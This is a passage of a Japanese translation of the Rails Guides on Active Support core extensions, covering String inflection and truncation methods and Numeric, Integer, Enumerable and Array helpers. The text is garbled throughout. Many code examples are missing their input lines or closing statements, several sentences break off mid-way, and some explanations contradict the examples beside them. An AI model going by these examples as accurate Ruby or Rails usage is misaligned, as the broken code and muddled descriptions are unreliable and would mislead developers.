" \n  foo\n\r \t bar \n".squish # => "foo bar"
このメソッドには破壊的なバージョンの`String#squish!`もあります。
このメソッドでは、ASCIIとUnicodeのホワイトスペースを扱えます。
### `truncate`
`truncate`メソッドは、指定された`length`にまで長さを切り詰めたレシーバのコピーを返します。
"Oh dear! Oh dear! 
I shall be late!".truncate(20)
# => "Oh dear! 
Oh dear!..."
`:omission`オプションを指定することで、省略文字 (…) をカスタマイズすることもできます。
I shall be late!".truncate(20, omission: '&hellip;')
Oh &hellip;"
文字列の切り詰めでは、省略文字列の長さも加味されることに特にご注意ください。
`:separator`を指定することで、自然な区切り位置で切り詰めることができます。
I shall be late!".truncate(18)
Oh dea..."
I shall be late!".truncate(18, separator: ' ')
Oh..."
`:separator`オプションで正規表現を使用することもできます。
I shall be late!".truncate(18, separator: /\s/)
上の例では、"dear"という文字で切り落とされそうになるところを、`:separator`によって防いでいます。
### `truncate_words`
`truncate_words`メソッドは、指定されたワード数から後ろをきりおとしたレシーバのコピーを返します。
I shall be late!".truncate_words(4)
I shall be late!".truncate_words(4, omission: '&hellip;')
Oh dear!
I shall be late!".truncate_words(3, separator: '!')
Oh dear! 
I shall be late..."
I shall be late!".truncate_words(4, separator: /\s/)
### `inquiry`
`inquiry`は、文字列を`StringInquirer`オブジェクトに変換します。このオブジェクトを使用すると、等しいかどうかをよりスマートにチェックできます。
"production".inquiry.production? 
"active".inquiry.inactive?       
### `starts_with?`と`ends_with?`
Active Supportでは、`String#start_with?`と`String#end_with?`を英語的に自然な三人称(starts、ends)にした別名も定義してあります。
f") # => true
o")   # => true
NOTE: 定義ファイルの場所は`active_support/core_ext/string/starts_ends_with.rb`です。
### `strip_heredoc`
`strip_heredoc`メソッドは、ヒアドキュメントのインデントを除去します。
以下に例を示します。
if options[:usage]
  puts <<-USAGE.strip_heredoc
    This command does such and such.
    Supported options are:
      -h         This message
      ...
  USAGE
このUSAGEメッセージは左寄せで表示されます。
技術的には、インデントが一番浅い行を探して、そのインデント分だけ行頭のホワイトスペースを全体から削除するという操作を行っています。
NOTE: 定義ファイルの場所は`active_support/core_ext/string/strip.rb`です。
### `indent`
このメソッドは、レシーバの行にインデントを与えます。
<<EOS.indent(2)
def some_method
  some_code
  def some_method
    some_code
2つめの引数`indent_string`は、インデントに使用する文字列を指定します。
デフォルトは`nil`であり、この場合最初にインデントされている行のインデント文字を参照してそこからインデント文字を推測します。インデントがまったくない場合はスペース1つを使用します。
"  foo".indent(2)        # => "    foo"
"foo\n\t\tbar".indent(2) # => "\t\tfoo\n\t\t\t\tbar"
"foo".indent(2, "\t")    # => "\t\tfoo"
`indent_string`には1文字のスペースまたはタブを使用するのが普通ですが、どんな文字でも使用できます。
3つ目の引数`indent_empty_lines`は、空行もインデントするかどうかを指定するフラグです。
デフォルトはfalseです。
"foo\n\nbar".indent(2)            # => "  foo\n\n  bar"
"foo\n\nbar".indent(2, nil, true) # => "  foo\n  \n  bar"
`indent!`メソッドはインデントをその場で (破壊的に) 行います。
NOTE: 定義ファイルの場所は`active_support/core_ext/string/indent.rb`です。
### Access
#### `at(position)`
対象となる文字列のうち、`position`で指定された位置にある文字を返します。
"hello".at(0)  # => "h"
"hello".at(4)  # => "o"
"hello".at(-1) # => "o"
"hello".at(10) # => nil
NOTE: 定義ファイルの場所は`active_support/core_ext/string/access.rb`です。
#### `from(position)`
文字列のうち、`position`で指定された位置から始まる部分文字列を返します。
"hello".from(0)  # => "hello"
"hello".from(2)  # => "llo"
"hello".from(-2) # => "lo"
#### `to(position)`
文字列のうち、`position`で指定された位置を終端とする部分文字列を返します。
"hello".to(0)  # => "h"
"hello".to(2)  # => "hel"
"hello".to(-2) # => "hell"
"hello".to(10) # => "hello"
#### `first(limit = 1)`
`str.first(n)`という呼び出しは、`n` > 0 のとき`str.to(n-1)`と等価です。`n` == 0の場合は空文字列を返します。
#### `last(limit = 1)`
### 活用形
#### `pluralize`
`pluralize`メソッドは、レシーバを「複数形」にしたものを返します。
"table".pluralize     # => "tables"
"ruby".pluralize      # => "rubies"
"equipment".pluralize # => "equipment"
上の例でも示したように、Active Supportは不規則な複数形や非可算名詞についてある程度知っています。
`config/initializers/inflections.rb`にあるビルトインのルールは拡張可能です。
このファイルは`rails`コマンドで拡張可能であり、方法はコメントに示されています。
`pluralize`メソッドではオプションで`count`パラメータを使用できます。
`count`がそれ以外の値の場合は複数形を返します(訳注: 英語では個数がゼロや小数の場合は複数形で表されます)。
"dude".pluralize(0) # => "dudes"
"dude".pluralize(1) # => "dude"
"dude".pluralize(2) # => "dudes"
Active Recordでは、モデル名に対応するデフォルトのテーブル名を求めるときにこのメソッドを使用しています。
# active_record/model_schema.rb
def undecorated_table_name(class_name = base_class.name)
  table_name = class_name.to_s.demodulize.underscore
  pluralize_table_names ? 
 table_name.pluralize : table_name
NOTE: 定義ファイルの場所は`active_support/core_ext/string/inflections.rb`です。
#### `singularize`
`pluralize`と逆の動作です。
"tables".singularize    # => "table"
"rubies".singularize    # => "ruby"
"equipment".singularize # => "equipment"
Railsの関連付け (association) では、関連付けられたクラスにデフォルトで対応する名前を求める時にこのメソッドが使用されます。
# active_record/reflection.rb
def derive_class_name
  class_name = name.to_s.camelize
  class_name = class_name.singularize if collection?
  class_name
#### `camelize`
`camelize`メソッドは、レシーバをキャメルケース (冒頭を大文字にした単語をスペースなしで連結した語) にしたものを返します。
"product".camelize    # => "Product"
"admin_user".camelize # => "AdminUser"
このメソッドは、パスをRubyのクラスに変換するときにもよく使用されます。スラッシュで区切られているパスは「::」で区切られます。
"backoffice/session".camelize # => "Backoffice::Session"
たとえばAction Packでは、特定のセッションストアを提供するクラスを読み込むのにこのメソッドを使用しています。
# action_controller/metal/session_management.rb
def session_store=(store)
  @@session_store = store.is_a?(
Symbol) ?
    ActionDispatch::Session.const_get(store.to_s.camelize) :
    store
`camelize`メソッドはオプションの引数を受け付けます。使用できるのは`:upper` (デフォルト) または`:lower`です。
後者を指定すると、冒頭が小文字になります。
"visual_effect".camelize(:lower) # => "visualEffect"
このメソッドは、そのような命名慣習に従っている言語 (JavaScriptなど) で使用される名前を求めるのに便利です。
INFO: `camerize`メソッドの動作は、`underscore`メソッドと逆の動作と考えるとわかりやすいでしょう。ただし完全に逆の動作ではありません。たとえば、`"SSLError".underscore.camelize`を実行した結果は`"SslError"`になり、元に戻りません。
このような場合をサポートするために、Active Supportでは`config/initializers/inflections.rb`の頭字語を指定することができます。
  inflect.acronym 'SSL'
"SSLError".underscore.camelize # => "SSLError"
`camelize`は`camelcase`の別名です。
#### `underscore`
`underscore`メソッドは上と逆に、キャメルケースをパスに変換します。
"Product".underscore   # => "product"
"AdminUser".underscore # => "admin_user"
"::"も"/"に逆変換されます。
"Backoffice::Session".underscore # => "backoffice/session"
小文字で始まる文字列も扱えます。
"visualEffect".underscore # => "visual_effect"
ただし`underscore`は引数を取りません。
Railsで自動的に読み込まれるクラスとモジュールは、`underscore`メソッドを使用してファイルの拡張子を除いた相対パスを推測し、指定された定数が失われている場合にそれを定義するのに役立てます。
# active_support/dependencies.rb
def load_missing_constant(from_mod, const_name)
  qualified_name = qualified_name_for from_mod, const_name
  path_suffix = qualified_name.underscore
INFO: `underscore`メソッドの動作は、`camelize`メソッドと逆の動作と考えるとわかりやすいでしょう。ただし完全に逆の動作ではありません。
たとえば、`"SSLError".underscore.camelize`を実行した結果は`"SslError"`になり、元に戻りません。
#### `titleize`
`titleize`メソッドは、レシーバの語の1文字目を大文字にします。
"alice in wonderland".titleize # => "Alice In Wonderland"
"fermat's enigma".titleize     # => "Fermat's Enigma"
`titleize`メソッドは`titlecase`の別名です。
#### `dasherize`
`dasherize`メソッドは、レシーバのアンダースコア文字をダッシュに置き換えます(訳注: ここで言うダッシュは実際には「ハイフンマイナス文字」(U+002D)です)。
"name".dasherize         # => "name"
"contact_data".dasherize # => "contact-data"
モデルのXMLシリアライザではこのメソッドを使用してノード名をダッシュ化しています。
# active_model/serializers/xml.rb
def reformat_name(name)
  name = name.camelize if camelize?
  dasherize? ? 
 name.dasherize : name
#### `demodulize`
`demodulize`メソッドは、フルパスの (qualified) 定数名を与えられると、パス部分を取り除いて右側の定数名だけにしたものを返します。
"Product".demodulize                        # => "Product"
"Backoffice::UsersController".demodulize    # => "UsersController"
"Admin::Hotel::ReservationUtils".demodulize # => "ReservationUtils"
"::Inflections".demodulize                  # => "Inflections"
"".demodulize                               # => ""
以下のActive Recordの例では、このメソッドを使用してcounter_cacheカラムの名前を求めています。
def counter_cache_column
  if options[:counter_cache] == true
    "#{active_record.name.demodulize.underscore.pluralize}_count"
  elsif options[:counter_cache]
    options[:counter_cache]
#### `deconstantize`
`deconstantize`メソッドは、フルパスの定数を表す参照表現を与えられると、一番右の部分 (通常は定数名) を取り除きます。
"Product".deconstantize                        # => ""
"Backoffice::UsersController".deconstantize    # => "Backoffice"
"Admin::Hotel::ReservationUtils".deconstantize # => "Admin::Hotel"
以下のActive Recordの例では、`Module#qualified_const_set`でこのメソッドを使用しています。
def qualified_const_set(path, value)
  QualifiedConstUtils.raise_if_absolute(path)
  const_name = path.demodulize
  mod_name = path.deconstantize
  mod = mod_name.empty? ? 
 self : qualified_const_get(mod_name)
  mod.const_set(const_name, value)
#### `parameterize`
`parameterize`メソッドは、レシーバを正しいURLで使用可能な形式に正規化します。
"John Smith".parameterize # => "john-smith"
"Kurt Gödel".parameterize # => "kurt-godel"
実際に得られる文字列は、`ActiveSupport::Multibyte::Chars`のインスタンスでラップされています。
#### `tableize`
`tableize`メソッドは、`underscore`の次に`pluralize`を実行したものです。
"Person".tableize      # => "people"
"Invoice".tableize     # => "invoices"
"InvoiceLine".tableize # => "invoice_lines"
単純な場合であれば、モデル名に`tableize`を使用するとモデルのテーブル名を得られます。
実際のActive Recordの実装は、単に`tableize`を実行する場合よりも複雑です。Active Recordではクラス名に対して`demodulize`も行っており、返される文字列に影響する可能性のあるオプションもいくつかチェックしています。
#### `classify`
`classify`メソッドは、`tableize`と逆の動作です。
与えられたテーブル名に対応するクラス名を返します。
"people".classify        # => "Person"
"invoices".classify      # => "Invoice"
"invoice_lines".classify # => "InvoiceLine"
このメソッドは、フルパスの (qualified) テーブル名も扱えます。
"highrise_production.companies".classify # => "Company"
`classify`が返すクラス名は文字列であることにご注意ください。
得られた文字列に対して`constantize` (後述) を実行することで本当のクラスオブジェクトを得られます。
#### `constantize`
`constantize`メソッドは、レシーバの定数参照表現を解決し、実際のオブジェクトを返します。
"M::X".constantize # => 1
与えられた文字列を`constantize`メソッドで評価しても既知の定数とマッチしない、または指定された定数名が正しくない場合は`NameError`が発生します。
`constantize`メソッドによる定数名解決は、常にトップレベルの`Object`から開始されます。これは上位に"::"がない場合でも同じです。
X = :in_Object
  X = :in_M
  X                 # => :in_M
  "::X".constantize # => :in_Object
  "X".constantize   # => :in_Object (!)
従って、このメソッドは、同じ場所でRubyが定数を評価したときの値と必ずしも等価ではありません。
メイラー (mailer) のテストケースでは、テストするクラスの名前からテスト対象のメイラーを取得するのに`constantize`メソッドを使用します。
# action_mailer/test_case.rb
def determine_default_mailer(name)
  name.sub(/Test$/, '').constantize
rescue NameError => e
  raise NonInferrableMailerError.new(name)
#### `humanize`
`humanize`メソッドは、属性名を (英語的に) 読みやすい表記に変換します。
具体的には以下の変換を行います。
  * 引数に (英語の) 活用ルールを適用します(inflection)。
  * 冒頭にアンダースコアがある場合は削除します。
  * 末尾に"_id"がある場合は削除します。
  * アンダースコアが他にもある場合はスペースに置き換えます。
  * 略語を除いてすべての単語を小文字にします(downcase)。
  * 最初の単語だけ冒頭の文字を大文字にします(capitalize)。
`capitalize`オプションをfalseにすると、冒頭の文字は大文字にされません(デフォルトはtrue)。
"name".humanize                         # => "Name"
"author_id".humanize                    # => "Author"
"author_id".humanize(capitalize: false) # => "author"
"comments_count".humanize               # => "Comments count"
"_id".humanize                          # => "Id"
"SSL"が頭字語と定義されている場合は以下のようにエラーになります。
'ssl_error'.humanize # => "SSL error"
ヘルパーメソッド`full_messages`では、属性名をメッセージに含めるときに`humanize`を使用しています。
def full_messages
  map { |attribute, message| full_message(attribute, message) }
def full_message
  attr_name = attribute.to_s.tr('.', '_').humanize
  attr_name = @base.class.human_attribute_name(attribute, default: attr_name)
#### `foreign_key`
`foreign_key`メソッドは、クラス名から外部キーカラム名を求める時に使用します。
具体的には、`demodulize`、`underscore`を実行し、末尾に "_id" を追加します。
"User".foreign_key           # => "user_id"
"InvoiceLine".foreign_key    # => "invoice_line_id"
"Admin::Session".foreign_key # => "session_id"
末尾の "_id" のアンダースコアが不要な場合は引数に`false`を指定します。
"User".foreign_key(false) # => "userid"
関連付け (association) では、外部キーの名前を推測するときにこのメソッドを使用します。たとえば`has_one`と`has_many`では以下を行っています。
# active_record/associations.rb
foreign_key = options[:foreign_key] || reflection.active_record.name.foreign_key
### 各種変換
#### `to_date`、`to_time`、`to_datetime`
`to_date`、`to_time`、`to_datetime`メソッドは、`Date._parse`をラップして使いやすくします。
"2010-07-27".to_date              # => Tue, 27 Jul 2010
"2010-07-27 23:37:00".to_time     # => Tue Jul 27 23:37:00 UTC 2010
"2010-07-27 23:37:00".to_datetime # => Tue, 27 Jul 2010 23:37:00 +0000
`to_time`はオプションで`:utc`や`:local`を引数に取り、タイムゾーンを指定することができます。
"2010-07-27 23:42:00".to_time(:utc)   # => Tue Jul 27 23:42:00 UTC 2010
"2010-07-27 23:42:00".to_time(:local) # => Tue Jul 27 23:42:00 +0200 2010
デフォルトは`:utc`です。
詳細については`Date._parse`のドキュメントを参照してください。
INFO: 3つのメソッドはいずれも、レシーバが空の場合は`nil`を返します。
NOTE: 定義ファイルの場所は`active_support/core_ext/string/conversions.rb`です。
`Numeric`の拡張
### バイト
すべての数値は、以下のメソッドに応答します。
kilobytes
megabytes
gigabytes
terabytes
petabytes
exabytes
これらのメソッドは、対応するバイト数を返すときに1024の倍数を使用します。
2.kilobytes   # => 2048
3.megabytes   # => 3145728
3.5.gigabytes # => 3758096384
-4.exabytes   # => -4611686018427387904
これらのメソッドには単数形の別名もあります。
1.megabyte # => 1048576
NOTE: 定義ファイルの場所は`active_support/core_ext/numeric/bytes.rb`です。
### Time
たとえば`45.minutes + 2.hours + 4.years`のように時間の計算や宣言を行なうことができます。
これらのメソッドでは、from_nowやagoなどを使用したり、またはTimeオブジェクトから得た結果の加減算を行なう際に、Time#advanceを使用して正確な日付計算を行っています。
# Time.current.advance(months: 1) と等価
1.month.from_now
# Time.current.advance(years: 2) と等価
2.years.from_now
# Time.current.advance(months: 4, years: 5) と等価
(4.months + 5.years).from_now
### フォーマッティング
数値はさまざまな方法でフォーマットできます。
以下のように、数値を電話番号形式の文字列に変換できます。
5551234.to_s(:phone)
# => 555-1234
1235551234.to_s(:phone)
# => 123-555-1234
1235551234.to_s(:phone, area_code: true)
# => (123) 555-1234
1235551234.to_s(:phone, delimiter: " ")
# => 123 555 1234
1235551234.to_s(:phone, area_code: true, extension: 555)
# => (123) 555-1234 x 555
1235551234.to_s(:phone, country_code: 1)
# => +1-123-555-1234
以下のように、数値を通貨形式の文字列に変換できます。
1234567890.50.to_s(:currency)                 # => $1,234,567,890.50
1234567890.506.to_s(:currency)                # => $1,234,567,890.51
1234567890.506.to_s(:currency, precision: 3)  # => $1,234,567,890.506
以下のように、数値を百分率形式の文字列に変換できます。
100.to_s(:percentage)
# => 100.000%
100.to_s(:percentage, precision: 0)
# => 100%
1000.to_s(:percentage, delimiter: '.', separator: ',')
# => 1.000,000%
302.24398923423.to_s(:percentage, precision: 5)
# => 302.24399%
以下のように、数値の桁区切りを追加して文字列形式にできます。
12345678.to_s(:delimited)                     # => 12,345,678
12345678.05.to_s(:delimited)                  # => 12,345,678.05
12345678.to_s(:delimited, delimiter: ".")     
# => 12.345.678
12345678.to_s(:delimited, delimiter: ",")     # => 12,345,678
12345678.05.to_s(:delimited, separator: " ")  # => 12,345,678 05
以下のように、数字を特定の精度に丸めて文字列形式にできます。
111.2345.to_s(:rounded)                     # => 111.235
111.2345.to_s(:rounded, precision: 2)       # => 111.23
13.to_s(:rounded, precision: 5)             # => 13.00000
389.32314.to_s(:rounded, precision: 0)      # => 389
111.2345.to_s(:rounded, significant: true)  # => 111
以下のように、数値を人間にとって読みやすいバイト数形式の文字列に変換できます。
123.to_s(:human_size)            # => 123 Bytes
1234.to_s(:human_size)           # => 1.21 KB
12345.to_s(:human_size)          # => 12.1 KB
1234567.to_s(:human_size)        # => 1.18 MB
1234567890.to_s(:human_size)     # => 1.15 GB
1234567890123.to_s(:human_size)  # => 1.12 TB
以下のように、数値を人間にとって読みやすいバイト数形式で単位が単語の文字列に変換できます。
123.to_s(:human)               # => "123"
1234.to_s(:human)              # => "1.23 Thousand"
12345.to_s(:human)             # => "12.3 Thousand"
1234567.to_s(:human)           # => "1.23 Million"
1234567890.to_s(:human)        # => "1.23 Billion"
1234567890123.to_s(:human)     # => "1.23 Trillion"
1234567890123456.to_s(:human)  # => "1.23 Quadrillion"
NOTE: 定義ファイルの場所は`active_support/core_ext/numeric/conversions.rb`です。
`Integer`の拡張
### `multiple_of?
`multiple_of?`メソッドは、レシーバの整数が引数の倍数であるかどうかをテストします。
1) # => true
2) # => false
NOTE: 定義ファイルの場所は`active_support/core_ext/integer/multiple.rb`です。
### `ordinal`
`ordinal`メソッドは、レシーバの整数に対応する序数のサフィックス文字列を返します。
1.ordinal    # => "st"
2.ordinal    # => "nd"
53.ordinal   # => "rd"
2009.ordinal # => "th"
-21.ordinal  # => "st"
-134.ordinal # => "th"
NOTE: 定義ファイルの場所は`active_support/core_ext/integer/inflections.rb`です。
### `ordinalize`
`ordinalize`メソッドは、レシーバの整数に、対応する序数文字列を追加したものをかえします。
先に紹介した`ordinal`メソッドは、序数文字列 **だけ** を返す点が異なることにご注意ください。
1.ordinalize    # => "1st"
2.ordinalize    # => "2nd"
53.ordinalize   # => "53rd"
-21.ordinalize  # => "-21st"
-134.ordinalize # => "-134th"
`BigDecimal`の拡張
### `to_s`
この`to_s`メソッドは、`to_formatted_s`メソッドの別名です。
このメソッドは、浮動小数点記法のBigDecimal値を簡単に表示するための便利な方法を提供します。
BigDecimal.new(5.00, 6).to_s  # => "5.0"
### `to_formatted_s`
この`to_formatted_s`メソッドは、"F"のデフォルトの指定部 (specifier) を提供します。
これは、`to_formatted_s`または`to_s`を単に呼び出すと、エンジニアリング記法 ('0.5E1'のような記法) ではなく浮動小数点記法を得られるということです。
BigDecimal.new(5.00, 6).to_formatted_s  # => "5.0"
また、シンボルを使用した指定部もサポートされます。
BigDecimal.new(5.00, 6).to_formatted_s(:db)  # => "5.0"
エンジニアリング記法も従来通りサポートされます。
BigDecimal.new(5.00, 6).to_formatted_s("e")  # => "0.5E1"
`Enumerable`の拡張
### `sum`
`sum`メソッドはenumerableの要素を合計します。
[1, 2, 3].sum # => 6
(1..100).sum  # => 5050
`+`に応答する要素のみが加算の対象として前提とされます。
[[1, 2], [2, 3], [3, 4]].sum    # => [1, 2, 2, 3, 3, 4]
%w(foo bar baz).sum             # => "foobarbaz"
{a: 1, b: 2, c: 3}.sum # => [:b, 2, :c, 3, :a, 1]
空のコレクションはデフォルトではゼロを返しますが、この動作はカスタマイズ可能です。
[].sum    # => 0
[].sum(1) # => 1
ブロックが与えられた場合、`sum`はイテレータになってコレクションの要素をyieldし、そこから返された値を合計します。
(1..5).sum {|n| n * 2 } # => 30
[2, 4, 6, 8, 10].sum    # => 30
ブロックを与える場合にも、レシーバが空のときのデフォルト値をカスタマイズできます。
[].sum(1) {|n| n**3} # => 1
NOTE: 定義ファイルの場所は`active_support/core_ext/enumerable.rb`です。
### `index_by`
`index_by`メソッドは、何らかのキーによってインデックス化されたenumerableの要素を持つハッシュを生成します。
このメソッドはコレクションを列挙し、各要素をブロックに渡します。
この要素は、ブロックから返された値によってインデックス化されます。
invoices.index_by(&:number)
# => {'2009-032' => <Invoice ...
>, '2009-008' => <Invoice ...
>, ...}
WARNING: キーは通常はユニークでなければなりません。
異なる要素から同じ値が返されると、そのキーのコレクションは作成されません。
返された項目のうち、最後の項目だけが使用されます。
NOTE: 定義ファイルの場所は`active_support/core_ext/enumerable.rb`です
### `many?
`many?`メソッドは、`collection.size > 1`の短縮形です。
<% if pages.many? 
  <%= pagination_links %>
`many?`は、ブロックがオプションとして与えられると、trueを返す要素だけを扱います。
@see_more = videos.many? 
 {|video| video.category == params[:category]}
### `exclude?
`exclude?`述語は、与えられたオブジェクトがそのコレクションに属して **いない** かどうかをテストします。
`include?`の逆の動作です。
to_visit << node if visited.exclude?(
`Array`の拡張
### Accessing
Active Supportには配列のAPIが多数追加されており、配列に容易にアクセスできるようになっています。
たとえば`to`メソッドは、配列の冒頭から、渡されたインデックスが示す箇所までの範囲を返します。
%w(a b c d).to(2) # => %w(a b c)
[].to(7)          # => []
同様に`from`メソッドは、配列のうち、インデックスが指す箇所から末尾までの要素を返します。
インデックスが配列のサイズより大きい場合は、空の配列を返します。
%w(a b c d).from(2)  # => %w(c d)
%w(a b c d).from(10) # => []
[].from(0)           # => []
`second`、`third`、`fourth`、`fifth`は、対応する位置の要素を返します (`first`は元からビルトインされています)。
社会の智慧と建設的な姿勢のおかげで、今では`forty_two`も使用できます (訳注: [Rails 2.2 以降](https://github.com/rails/rails/commit/9d8cc60ec3845fa3e6f9292a65b119fe4f619f7e)で使えます。「42」については、Wikipediaの[生命、宇宙、そして万物についての究極の疑問の答え](http://ja.wikipedia.org/wiki/%E7%94%9F%E5%91%BD%E3%80%81%E5%AE%87%E5%AE%99%E3%80%81%E3%81%9D%E3%81%97%E3%81%A6%E4%B8%87%E7%89%A9%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6%E3%81%AE%E7%A9%B6%E6%A5%B5%E3%81%AE%E7%96%91%E5%95%8F%E3%81%AE%E7%AD%94%E3%81%88)を参照してください)。
%w(a b c d).third # => c
%w(a b c d).fifth # => nil
NOTE: 定義ファイルの場所は`active_support/core_ext/array/access.rb`です。
### 要素を加える
#### `prepend`
このメソッドは、`Array#unshift`の別名です。
%w(a b c d).prepend('e')  # => %w(e a b c d)
[].prepend(10)            # => [10]
NOTE: 定義ファイルの場所は`active_support/core_ext/array/prepend_and_append.rb`です。
#### `append`
このメソッドは、`Array#<<`の別名です。
%w(a b c d).append('e')  # => %w(a b c d e)
[].append([1,2])         # => [[1,2]]
### オプションの展開
Rubyでは、メソッドに与えられた最後の引数がハッシュの場合、それが`&block`引数である場合を除いて、ハッシュの波括弧を省略できます。
email: params[:email])
このようなシンタックスシュガーは、多数ある引数が順序に依存することを避け、名前付きパラメータをエミュレートするインターフェイスを提供するためにRailsで多用されています。
特に、末尾にオプションのハッシュを置くというのは定番中の定番です。
しかし、あるメソッドが受け取る引数の数が固定されておらず、メソッド宣言で`*`が使用されていると、そのような波括弧なしのオプションハッシュは、引数の配列の末尾の要素になってしまい、ハッシュとして認識されなくなってしまいます。
このような場合、`extract_options!
それがハッシュの場合、そのハッシュを取り出して返し、それ以外の場合は空のハッシュを返します。
`caches_action`コントローラマクロでの定義を例にとって見てみましょう。
def caches_action(*actions)
  return unless cache_configured?
  options = actions.extract_options!
このメソッドは、任意の数のアクション名を引数に取ることができ、引数の末尾項目でオプションハッシュを使用できます。
`extract_options!`メソッドを使用すると、このオプションハッシュを取り出し、`actions`から取り除くことが簡単かつ明示的に行えます。
NOTE: 定義ファイルの場所は`active_support/core_ext/array/extract_options.rb`です。
#### `to_sentence`
`to_sentence`メソッドは、配列を変換して、要素を列挙する英文にします。
%w().to_sentence                # => ""
%w(Earth).to_sentence           # => "Earth"
%w(Earth Wind).to_sentence      # => "Earth and Wind"
%w(Earth Wind Fire).to_sentence # => "Earth, Wind, and Fire"
このメソッドは3つのオプションを受け付けます。
* `:two_words_connector`: 項目数が2つの場合の接続詞を指定します。
デフォルトは" and "です。
* `:words_connector`: 3つ以上の要素を接続する場合、最後の2つの間以外で使われる接続詞を指定します。
デフォルトは", "です。
* `:last_word_connector`: 3つ以上の要素を接続する場合、最後の2つの要素で使用する接続詞を指定します。
デフォルトは", and "です。
これらのオプションは標準の方法でローカライズできます。使用するキーは以下のとおりです。
| オプション                 | I18n キー                            |
| ---------------------- | ----------------------------------- |
| `:two_words_connector` | `support.array.two_words_connector` |
| `:words_connector`     | `support.array.words_connector`     |
| `:last_word_connector` | `support.array.last_word_connector` |
NOTE: 定義ファイルの場所は`active_support/core_ext/array/conversions.rb`です。
#### `to_formatted_s`
`to_formatted_s`メソッドは、デフォルトでは`to_s`と同様に振る舞います。
ただし、配列の中に`id`に応答する項目がある場合は、`:db`というシンボルを引数として渡すことで対応できる点が異なります。
この手法は、Active Recordオブジェクトのコレクションに対してよく使われます。
返される文字列は以下のとおりです。
[].to_formatted_s(:db)            # => "null"
[user].to_formatted_s(:db)        # => "8456"
invoice.lines.to_formatted_s(:db) # => "23,567,556,12"
上の例の整数は、`id`への呼び出しによって取り出されたものと考えられます。
#### `to_xml`
`to_xml`メソッドは、レシーバをXML表現に変換したものを含む文字列を返します。
Contributor.limit(2).order(:rank).to_xml
xml version="1.0" encoding="UTF-8"?
# <contributors type="array">
#   <contributor>
#     <id type="integer">4356</id>
#     <name>Jeremy Kemper</name>
#     <rank type="integer">1</rank>
#     <url-id>jeremy-kemper</url-id>
#   </contributor>
#     <id type="integer">4404</id>
#     <name>David Heinemeier Hansson</name>
#     <rank type="integer">2</rank>
#     <url-id>david-heinemeier-hansson</url-id>
# </contributors>
実際には、`to_xml`をすべての要素に送り、結果をルートノードの下に集めます。
すべての要素が`to_xml`に応答する必要があります。そうでない場合は例外が発生します。
デフォルトでは、ルート要素の名前は最初の要素のクラス名を複数形にしてアンダースコア化(underscorize)とダッシュ化(dasherize)を行います。残りの要素も最初の要素と同じ型 (`is_a?`でチェックされます) に属し、ハッシュでないことが前提となっています。
上の例で言うと、"contributors"です。
最初の要素と同じ型に属さない要素が1つでもある場合、ルートノードには`objects`が使用されます。
[Contributor.first, Commit.first].to_xml
# <objects type="array">
#   <object>
#     <id type="integer">4583</id>
#     <name>Aaron Batalion</name>
#     <rank type="integer">53</rank>
#     <url-id>aaron-batalion</url-id>
#   </object>
#     <author>Joshua Peek</author>
#     <authored-timestamp type="datetime">2009-09-02T16:44:36Z</authored-timestamp>
#     <branch>origin/master</branch>
#     <committer>Joshua Peek</committer>
#     <git-show nil="true"></git-show>
#     <id type="integer">190316</id>
#     <imported-from-svn type="boolean">false</imported-from-svn>
#     <message>Kill AMo observing wrap_with_notifications since ARes was only using it</message>
#     <sha1>723a47bfb3708f968821bc969a9a3fc873a3ed58</sha1>
# </objects>
レシーバがハッシュの配列である場合、ルート要素はデフォルトで`objects`になります。
[{a: 1, b: 2}, {c: 3}].to_xml
#     <b type="integer">2</b>
#     <a type="integer">1</a>
#     <c type="integer">3</c>
WARNING: コレクションが空の場合、ルート要素はデフォルトで"nilクラス"になります。
ここからわかるように、たとえば上の例でのcontributorsのリストのルート要素は、コレクションがもし空であれば "contributors" ではなく "nilクラス" になってしまうということです。
`:root`オプションを使用することで一貫したルート要素を使用することもできます。
子ノードの名前は、デフォルトではルートノードを単数形にしたものが使用されます。
上の例で言うと"contributor"や"object"です。
`:children`オプションを使用すると、これらをノード名として設定できます。
デフォルトのXMLビルダは、`Builder::XmlMarkup`から直接生成されたインスタンスです。
`:builder`オブションを使用することで、独自のビルダを構成できます。
このメソッドでは`:dasherize`とその同族と同様のオプションが使用できます。それらのオプションはビルダに転送されます。
Contributor.limit(2).order(:rank).to_xml(skip_types: true)
# <contributors>
#     <id>4356</id>
#     <rank>1</rank>
#     <id>4404</id>
#     <rank>2</rank>
### ラッピング
`Array.wrap`メソッドは、配列の中にある引数が配列 (または配列のようなもの) になっていない場合に、それらを配列の中にラップします。
特徴:
* 上記以外の場合で、引数が`to_ary`に応答する場合は`to_ary`が呼び出され、`to_ary`の値が`nil`でない場合はその値が返されます。
* 上記以外の場合、引数を内側に含んだ配列 (要素が1つだけの配列) が返されます。
Array.wrap(nil)       # => []
Array.wrap([1, 2, 3]) # => [1, 2, 3]
Array.wrap(0)         # => [0]
このメソッドの目的は`Kernel#Array`と似ていますが、いくつかの相違点があります。
* 引数が`to_ary`に応答する場合、このメソッドが呼び出されます。
* `to_ary`から返された値が`nil`でも`Array`オブジェクトでもない場合、`Kernel#Array`は例外を発生しますが、`Array.wrap`は例外を発生せずに単にその値を返します。
最後の性質は、列挙型同士を比較する場合に特に便利です。
Array.wrap(foo: :bar) # => [{:foo=>:bar}]
Array(foo: :bar)      # => [[:foo, :bar]]
この動作は、スプラット演算子を使用する手法にも関連します。
[*object]
上はRuby 1.8の場合、`nil`に対して`[nil]`を返し、それ以外の場合には`Array(object)`を呼び出します
(1.9のcontact機能の正確な動作を理解していることが前提です)。
従って、この場合`nil`に対する動作は異なり、上で説明されている`Kernel#Array`についてもこの異なる動作が残りの`object`に適用されます。
NOTE: 定義ファイルの場所は`active_support/core_ext/array/wrap.rb`です。
### 複製
`Array.deep_dup`メソッドは、自分自身を複製すると同時に、その中のすべてのオブジェクトをActive Supportの`Object#deep_dup`メソッドによって再帰的に複製します。
この動作は、`Array#map`を使用して`deep_dup`メソッドを内部の各オブジェクトに適用するのと似ています。
array = [1, [2, 3]]
dup = array.deep_dup
dup[1][2] = 4
array[1][2] == nil   # => true
### グループ化
#### `in_groups_of(number, fill_with = nil)`
`in_groups_of`メソッドは、指定のサイズで配列を連続したグループに分割します。
分割されたグループを内包する配列を1つ返します。
[1, 2, 3].in_groups_of(2) # => [[1, 2], [3, nil]]
ブロックが渡された場合はyieldします。
<% sample.in_groups_of(3) do |a, b, c| %>
    <td><%= a %></td>
    <td><%= b %></td>
    <td><%= c %></td>
